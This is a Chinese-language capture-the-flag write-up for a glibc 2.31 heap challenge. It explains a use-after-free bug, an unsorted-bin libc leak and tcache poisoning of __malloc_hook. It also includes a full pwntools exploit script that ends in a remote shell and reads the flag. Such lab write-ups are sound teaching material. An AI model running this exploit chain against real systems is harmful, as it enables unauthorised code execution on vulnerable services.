# UAF

## 题目简述

题目提供 glibc 2.31 环境下的菜单堆程序。`delete()` 释放堆块后没有把 `ptrlist[idx]` 清空，因此同一索引仍可被 `show()` 和 `edit()` 使用，形成释放后使用（Use-After-Free）。

利用分两步：先让一个 $0x110$ 大小的 chunk 进入 unsorted bin，通过悬空指针泄露 `main_arena`；再污染 $0x80$ tcache 链表，把一次分配重定向到 `__malloc_hook`，写入 one-gadget 并触发 `malloc()`。

## 解题过程

漏洞点很直接：

```c
void delete() {
    int idx = getint();
    if (idx < 0 || idx > 0x10 || ptrlist[idx] == NULL) {
        puts("Invalid index!");
        return;
    }
    free(ptrlist[idx]);
    /* ptrlist[idx] 未清零 */
}
```

此外，数组大小为 `0x10`，合法下标应为 0～15，而检查使用 `idx > 0x10`，会额外放行下标 16；本解法不需要利用这个越界。

### 1. 泄露 libc

请求大小 `0x100` 对应 $0x110$ chunk。先释放 7 个同尺寸 chunk 填满对应 tcache bin，再释放第 8 个，后者会进入 unsorted bin。其用户区开头被写入指向 `main_arena+96` 的 `fd`/`bk`，而悬空索引仍可通过 `%s` 输出。

题目随附 glibc 2.31 中，该泄露相对 libc 基址的偏移为 `0x1ecbe0`：

```python
libc.address = leak - 0x1ECBE0
```

### 2. tcache poisoning

glibc 2.31 尚未引入 safe-linking，tcache 单链表的 `next` 指针不做地址编码。释放 3 个请求大小为 `0x70` 的 chunk 后，编辑链表头的已释放 chunk，把 `next` 改为 `__malloc_hook`。连续申请两次：第一次取回真实 chunk，第二次便返回 `__malloc_hook`。

完整利用脚本如下；`libc.so.6` 必须使用题目附件中的版本：

```python
from pwn import *


HOST = "TARGET"
PORT = 9999

context(os="linux", arch="amd64")
io = remote(HOST, PORT)
libc = ELF("./libc.so.6", checksec=False)


def add(index, size, content):
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b"Enter index: ", str(index).encode())
    io.sendlineafter(b"Enter size: ", str(size).encode())
    io.sendafter(b"Enter data: ", content)


def delete(index):
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b"Enter index: ", str(index).encode())


def show(index):
    io.sendlineafter(b">> ", b"3")
    io.sendlineafter(b"Enter index: ", str(index).encode())


def edit(index, content):
    io.sendlineafter(b">> ", b"4")
    io.sendlineafter(b"Enter index: ", str(index).encode())
    io.sendafter(b"Enter data: ", content)


# 填满 0x110 tcache，再让 chunk 8 进入 unsorted bin。
add(8, 0x100, p64(0))
for index in range(7):
    add(index, 0x100, p64(0))
for index in range(7):
    delete(index)
delete(8)

show(8)
io.recvuntil(b"Data: ")
leak = u64(io.recvline().rstrip().ljust(8, b"\x00")[:8])
libc.address = leak - 0x1ECBE0
log.success(f"libc = {libc.address:#x}")

# 0x80 tcache：11 -> 10 -> 9，随后把 11->next 改为 malloc_hook。
add(9, 0x70, b"9")
add(10, 0x70, b"10")
add(11, 0x70, b"11")
delete(9)
delete(10)
delete(11)

malloc_hook = libc.sym["__malloc_hook"]
edit(11, p64(malloc_hook))

add(12, 0x70, b"take real chunk")
one_gadget = libc.address + 0xE3B01
add(13, 0x70, p64(one_gadget))

# 下一次 malloc 会先调用被覆盖的 __malloc_hook。
io.sendlineafter(b">> ", b"1")
io.sendlineafter(b"Enter index: ", b"14")
io.sendlineafter(b"Enter size: ", b"112")
io.interactive()
```

取得 Shell 后，xinetd 已把进程 chroot 到 `/home/ctf`，因此容器中复制到 `/home/ctf/flag` 的文件表现为：

```bash
cat /flag
```

当前仓库快照只保留了 Dockerfile 中的 `COPY build/flag /home/ctf/flag`，没有提交 `build/flag` 的实际内容，所以不能从静态仓库可靠补写固定 flag 字符串，应以服务返回为准。

## 方法总结

本题利用链为“UAF 泄露 unsorted bin 指针 → 计算 libc 基址 → UAF 改写 tcache `next` → 分配到 `__malloc_hook` → one-gadget”。glibc 版本决定可用原语：2.31 没有 safe-linking 且仍保留 malloc hook，不能把该脚本的偏移和技巧无条件套到新版本。
